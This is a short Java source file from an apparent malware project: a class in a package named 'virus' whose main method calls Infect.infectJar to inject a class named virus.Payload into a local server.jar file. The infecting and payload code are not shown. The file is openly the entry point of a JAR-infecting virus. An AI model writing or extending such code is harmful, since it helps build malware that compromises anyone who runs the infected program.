package virus;

import java.io.File;
import java.io.IOException;

public class Run {

    public static void main(String[] args) throws IOException {
        Infect.infectJar(new File("/home/ian/Desktop/virus/server.jar"), "virus.Payload");
    }

}
